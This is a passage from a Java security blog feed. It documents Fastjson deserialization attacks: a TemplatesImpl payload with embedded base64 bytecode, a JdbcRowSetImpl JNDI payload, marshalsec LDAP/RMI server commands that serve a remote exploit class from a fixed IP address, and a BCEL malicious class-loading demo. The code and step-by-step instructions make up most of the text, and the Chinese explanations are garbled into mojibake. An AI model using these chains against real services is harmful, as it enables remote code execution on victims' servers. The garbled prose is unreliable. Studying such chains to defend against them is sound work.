class="string">&quot;yv66vgAAADQANgoACAAmCAAnCgAoACkKACgAKgcAKwoABQAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAdMU2hlbGw7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACsBAApTb3VyY2VGaWxlAQAKU2hlbGwuamF2YQwACQAKAQAEY2FsYwcAMAwAMQAyDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAA1AAoBAAVTaGVsbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACgANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHQANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAcQACAAEAAAAUEgJLuAADKrYABFenAAhLKrYABrEAAQAAAAsADgAFAAMADAAAABoABgAAAA4AAwAPAAsAEgAOABAADwARABMAEwANAAAAFgACAAMACAAeAB8AAAAPAAQAIAAhAAAAIgAAAAcAAk4HACMEAAEAJAAAAAIAJQ==&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Chu0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_auxClasses&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_transletIndex&quot;</span><span class="punctuation">:</span><span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„_nameå’Œ_tfactoryæ˜¯ä¸ºäº†é˜²æ­¢ä¸ºnullè¿›è€ŒæŠ¥é”™ï¼Œé“¾å­åˆ†æ</p><p>fjä¼šåœ¨åˆ›å»ºä¸€ä¸ªç±»å®ä¾‹æ—¶ä¼šé€šè¿‡åå°„è°ƒç”¨ç±»ä¸­ç¬¦åˆæ¡ä»¶çš„å‚æ•°çš„getteræˆ–è€…setteræ–¹æ³•ï¼Œè¿™é‡Œæ˜¯getteræ–¹æ³•ä¹Ÿå°±æ˜¯getOutputProperties()ï¼Œè¿™æ˜¯å…¥å£ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨è¯¥æ–¹æ³•ä¸­çš„newTransformer()ï¼Œå†åˆ°newTransformer()æ–¹æ³•ä¸­çš„getTransletInstance()ï¼Œç”±äºæˆ‘ä»¬çš„_classä¸ºç©ºï¼Œæ‰€ä»¥æ ¹æ®é€»è¾‘åˆä¼šè§¦å‘defineTransletClassesï¼Œç”±äº_bytecodesä¸ä¸ºnullï¼Œæ‰€ä»¥å°±ä¼šå°†_bytecodes[0]ä¸­çš„å­—èŠ‚ç åŠ è½½è¿›_class[0]ä¸­ï¼Œæœ€åï¼Œåœ¨_class[_transletIndex].getConstructor().newInstance();å°†æ¶æ„ç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„å‘½ä»¤</p><h2 id="JdbcRowSetImpl-ååºåˆ—åŒ–">JdbcRowSetImpl ååºåˆ—åŒ–</h2><p>å¾ˆå¥½ç†è§£com.sun.rowset.JdbcRowSetImplæœ‰ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªæ˜¯setAutoCommit()ï¼Œä¸€ä¸ªæ˜¯connect()ï¼Œæ¼æ´çš„ä¸»è¦æˆå› æ˜¯connectä¸­çš„lookupå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸‹é¢æ˜¯setAutoCommit</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240319105150237.png" alt="image-20240319105150237"></p><p>åœ¨è¿™é‡Œè°ƒç”¨äº†connectæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¸ª</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240319105245765.png" alt="image-20240319105245765"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å°±çœ‹åˆ°äº†lookupå‡½æ•°ï¼Œä»–çš„å‚æ•°æ˜¯getDataSourceNameï¼Œæ ¹æ®fjçš„è¿è¡ŒåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥æ˜ç™½åœ¨åˆ›å»ºå®ä¾‹çš„æ—¶å€™fjä¼šè°ƒç”¨å¯¹åº”å‚æ•°çš„getteræˆ–è€…setteræ–¹æ³•ï¼Œpayloadå¦‚ä¸‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://110.41.17.183:5555/ExploitTest&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>é“¾å­åˆ†æï¼Œåœ¨è¿™é‡Œå…ˆè§¦å‘getdataSourceNameç»™dataSourceNameèµ‹å€¼ï¼Œå†è§¦å‘setteræ–¹æ³•è§¦å‘setAutoCommitï¼Œè¿›è€Œå®Œæˆæ•´æ¡é“¾å­</p><p>å¼€å¯httpæœåŠ¡</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.<span class="keyword">server</span></span><br><span class="line"><span class="meta">#é»˜è®¤8000ç«¯å£</span></span><br></pre></td></tr></table></figure><p>å·¥å…·<strong>marshalsec-0.0.3-SNAPSHOT-all.jar</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-<span class="literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://110.41.17.183:8080/#Exploit&quot;</span> <span class="number">5555</span></span><br><span class="line"><span class="attribute">java</span> -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-<span class="literal">all</span>.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://110.41.17.183:8080/#Exploit&quot;</span> <span class="number">5555</span></span><br></pre></td></tr></table></figure><p>åœ¨æŸipï¼Œä¸€èˆ¬å°±ä¸ºæœ¬æœºipï¼Œå¼€å¯RMIæˆ–è€…LDAPæœåŠ¡</p><p>FastJsonServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://110.41.17.183:5555/ExploitTest\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ExploitTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExploitTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExploitTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//ç›´æ¥åœ¨æ„é€ æ–¹æ³•ä¸­è¿è¡Œè®¡ç®—å™¨</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“æ“ä½œï¼š</p><p>1.åœ¨æœåŠ¡å™¨å¼€å¯RMIæˆ–è€…LDAPæœåŠ¡</p><p>2.åœ¨åŒç›®å½•ä¸‹å¼€å¯httpæœåŠ¡</p><p>3.å°†Exploit.javaç¼–è¯‘ä¸ºclassæ–‡ä»¶ï¼Œæ”¾åˆ°ä¸Šè¾¹å¼€å¯æœåŠ¡çš„åŒç›®å½•ä¸‹</p><p>4.æ‰§è¡ŒFastJsonServer.java</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>BCELåŠ è½½æ¶æ„ç±»</title>
    <link href="https://bowuchuling.github.io/posts/18juyiuw0.html"/>
    <id>https://bowuchuling.github.io/posts/18juyiuw0.html</id>
    <published>2024-03-28T11:18:58.793Z</published>
    <updated>2024-03-28T12:51:13.703Z</updated>
    
    <content type="html"><![CDATA[<h1>BCEL</h1><p>ä¸‹é¢å°†è®²è¿°bcelåŠ è½½æ¶æ„ç±»çš„è¯¦ç»†è¿‡ç¨‹</p><h2 id="BCELæ˜¯ä»€ä¹ˆ">BCELæ˜¯ä»€ä¹ˆ</h2><p>å¼•ç”¨è‡ªCSDN</p><p>BCELåŸæœ¬æ˜¯Apache Jakartaçš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œåæ¥æˆä¸ºäº†Apache Commonsçš„ä¸€ä¸ªå­é¡¹ç›®ã€‚Apache Commons Collectionsæƒ³å¿…å¤§å®¶éƒ½çŸ¥é“ï¼Œå°±æ˜¯å¸¸è¯´çš„CCé“¾ï¼Œä¹Ÿæ˜¯Apache Commonsçš„ä¸€ä¸ªå­é¡¹ç›®</p><p>BCELä¸»è¦ç”¨äºåˆ†æã€åˆ›å»ºã€æ“çºµJava classæ–‡ä»¶ï¼ŒåŒ…å«åœ¨åŸç”ŸåŸç”ŸJDKä¸­ï¼ˆcom.sun.org.apache.bcelï¼‰ï¼Œä¹‹æ‰€ä»¥åŒ…å«åœ¨åŸç”ŸJDKä¸»è¦åŸå› å¯èƒ½æ˜¯ä¸ºäº†æ”¯æ’‘Java XMLçš„ä¸€äº›åŠŸèƒ½ï¼ŒJava XMLåŠŸèƒ½åŒ…å«äº†JAXPï¼ˆJava API for XML Processingï¼‰è§„èŒƒï¼ŒJavaä¸­è‡ªå¸¦çš„JAXPå®ç°ä½¿ç”¨äº†Apache Xerceså’ŒApache Xalanï¼ŒApache Xalanåˆä¾èµ–äº†BCELï¼Œæ‰€ä»¥BCELä¹Ÿè¢«æ”¾å…¥äº†æ ‡å‡†åº“ä¸­ã€‚</p><p>Apache Xalanå®ç°äº†å…¶ä¸­XSLTç›¸å…³çš„éƒ¨åˆ†ï¼Œå…¶ä¸­åŒ…æ‹¬xsltc compilerã€‚</p><p>XSLTC Compilerå°±æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œç¼–è¯‘å™¨ï¼Œå¯ä»¥å°†ä¸€ä¸ªxslæ–‡ä»¶ç¼–è¯‘æˆä¸€ä¸ªclassæ–‡ä»¶æˆ–jaræ–‡ä»¶ï¼Œç¼–è¯‘åçš„classè¢«ç§°ä¸ºtransletï¼Œå¯ä»¥åœ¨åç»­ç”¨äºå¯¹XMLæ–‡ä»¶çš„è½¬æ¢ã€‚å…¶å®å°±å°†XSLTçš„åŠŸèƒ½è½¬åŒ–æˆäº†Javaä»£ç ï¼Œä¼˜åŒ–æ‰§è¡Œçš„é€Ÿåº¦ï¼Œå¦‚æœæˆ‘ä»¬ä¸ä½¿ç”¨è¿™ä¸ªå‘½ä»¤è¡Œç¼–è¯‘å™¨è¿›è¡Œç¼–è¯‘ï¼ŒJavaå†…éƒ¨ä¹Ÿä¼šåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å­˜åœ¨ç¼–è¯‘çš„è¿‡ç¨‹ã€‚</p><p>å› ä¸ºéœ€è¦ç¼–è¯‘æ–‡ä»¶ï¼Œå®é™…ä¸Šæ˜¯åŠ¨æ€ç”ŸæˆJavaå­—èŠ‚ç ï¼ŒBCELæ­£æ˜¯ä¸€ä¸ªJavaå¤„ç†å­—èŠ‚ç çš„åº“ï¼Œæ‰€ä»¥Apache Xalanåˆä¾èµ–äº†BCEL</p><h2 id="CalssLoader">CalssLoader</h2><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$xd&quot;</span>;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(str).newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆå¯¹äºbcelçš„ç±»åŠ è½½æœºåˆ¶com.sun.org.apache.bcel.internal.util.ClassLoaderè¿›è¡Œæ–­ç‚¹åˆ†æï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä»£ç </p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320223023444.png" alt="image-20240320223023444"></p><p>å¯è§ClassLoaderä¸­å¯¹äº$$BCEL$$å­—æ®µè¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœå­˜åœ¨å°±å¯¹class_nameæ‰§è¡Œcreate_classæ–¹æ³•ï¼Œè·Ÿè¸ªè¯¥æ–¹æ³•ï¼Œç»“æœå¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320223944065.png" alt="image-20240320223944065"></p><p>ä¸ªäººæ„Ÿè§‰è¿™é‡Œå°±æ˜¯å¯¹bcelå¯ä»¥åŠ è½½æ¶æ„ç±»æœ€ç›´è§‚çš„è§£é‡Šï¼Œæ ¹æ®ä»£ç é€»è¾‘ï¼Œå…¶æˆªå–äº†$$BCEL$$ä¹‹åçš„å­—ç¬¦ï¼Œå¹¶å°†å…¶è§£ç ï¼Œä»¥ç±»çš„å½¢å¼è¿”å›ï¼Œå›åˆ°ä¸Šå±‚ä»£ç ç»§ç»­åˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320224545715.png" alt="image-20240320224545715"></p><p>å¾—åˆ°clazzä¹‹åå°±åˆ°è¾¾äº†ä¸‹é¢æ¡†æ¡†é‡Œçš„ä»£ç ï¼Œè°ƒç”¨äº†ClassLoaderç±»çš„æ ¸å¿ƒæ–¹æ³•<code>defineClass</code>ï¼ˆå®šä¹‰ä¸€ä¸ªJavaç±»ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬åœ¨$$BCEL$$åè¡—ä¸Šæ¶æ„ç±»çš„ä»£ç ï¼Œåœ¨è¿™é‡Œå°±ä¼šå°†å…¶å½»åº•è§£æï¼Œè¿›è€Œå®Œæˆæ¶æ„ç±»çš„æ„é€ ã€‚</p><h2 id="æ„é€ æ¶æ„ç±»">æ„é€ æ¶æ„ç±»</h2><p>äº†è§£äº†bcelåŠ è½½æ¶æ„ç±»çš„è¿‡ç¨‹ï¼Œä¸‹é¢å°±éœ€è¦è¿›è¡Œæ¶æ„ç±»çš„æ„é€ ï¼Œå…³é”®åœ¨äºä¸Šé¢åˆ†æè¿‡çš„createClassæ–¹æ³•ï¼Œå…¶ä¸­å¯¹äº$$BCEL$$åçš„ä»£ç è¿›è¡Œäº†è§£ç å¤„ç†ï¼Œå¦‚ä¸‹å›¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320225449811.png" alt="image-20240320225449811"></p><p>æ‰€ä»¥æˆ‘ä»¬æ„é€ çš„æ—¶å€™éœ€è¦å°†ç±»è¿›è¡ŒåŒæ ·çš„ç¼–ç å¤„ç†ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹</p><p><strong>TestBCEL.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//å¯¼å…¥æ¶æ„ç±»</span></span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(classloader.Calc.class);</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$&quot;</span>;</span><br><span class="line">        <span class="comment">//å°†æ¶æ„ç±»çš„å­—èŠ‚ç ç¼–ç åå’Œ\$\$BCEL\$\$æ‹¼æ¥</span></span><br><span class="line">            str += Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//åˆ©ç”¨bcelåŠ è½½æ¶æ„ç±»</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(str).newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Calc.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240320225755058.png" alt="image-20240320225755058"></p><h2 id="tomcat-dbcpåˆ†æ">tomcat-dbcpåˆ†æ</h2><p>ä¸‹é¢å°†ä¼šå°†bcelå’Œdbcpç»“åˆèµ·æ¥ç»¼åˆåˆ†æï¼Œåˆ©ç”¨é“¾å¦‚ä¸‹</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BasicDataSource<span class="selector-class">.getConnection</span>() &gt; <span class="built_in">createDataSource</span>() &gt; <span class="built_in">createConnectionFactory</span>()</span><br></pre></td></tr></table></figure><p>è·Ÿè¸ªBasicDataSource#getConnectionæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321094112777.png" alt="image-20240321094112777"></p><p>ç»§ç»­è·Ÿè¸ªBasicDataSource#createDataSourceæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321094218327.png" alt="image-20240321094218327"></p><p>å¯ä»¥å‘ç°åœ¨è¿™é‡Œè°ƒç”¨äº†BasicDataSource#createConnectionFactoryï¼Œç»§ç»­è·Ÿè¸ªè¯¥æ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321094308710.png" alt="image-20240321094308710"></p><p>driverClassNameå’ŒdriverClassLoaderéƒ½æ˜¯è¯¥ç±»ä¸‹çš„æˆå‘˜å˜é‡ï¼ˆå¯æ§ï¼‰ï¼Œå¹¶åˆ©ç”¨forNameå‡½æ•°è¿›è¡Œäº†ç±»åŠ è½½</p><p><strong>ç±»åŠ è½½æœºåˆ¶</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åå°„åŠ è½½TestHelloWorldç¤ºä¾‹</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoaderåŠ è½½TestHelloWorldç¤ºä¾‹</span></span><br><span class="line"><span class="built_in">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>Class.forName(&quot;ç±»å&quot;)</code>é»˜è®¤ä¼šåˆå§‹åŒ–è¢«åŠ è½½ç±»çš„é™æ€å±æ€§å’Œæ–¹æ³•ï¼Œå¦‚æœä¸å¸Œæœ›åˆå§‹åŒ–ç±»å¯ä»¥ä½¿ç”¨<code>Class.forName(&quot;ç±»å&quot;, æ˜¯å¦åˆå§‹åŒ–ç±», ç±»åŠ è½½å™¨)</code>ï¼Œè€Œ<code>ClassLoader.loadClass</code>é»˜è®¤ä¸ä¼šåˆå§‹åŒ–ç±»æ–¹æ³•ã€‚</p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨Class.forNameæ–¹æ³•å®ç°æˆ‘ä»¬çš„æ¶æ„ç±»åŠ è½½ï¼ŒéªŒè¯è„šæœ¬å¦‚ä¸‹</p><p><strong>FjBCEL.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> 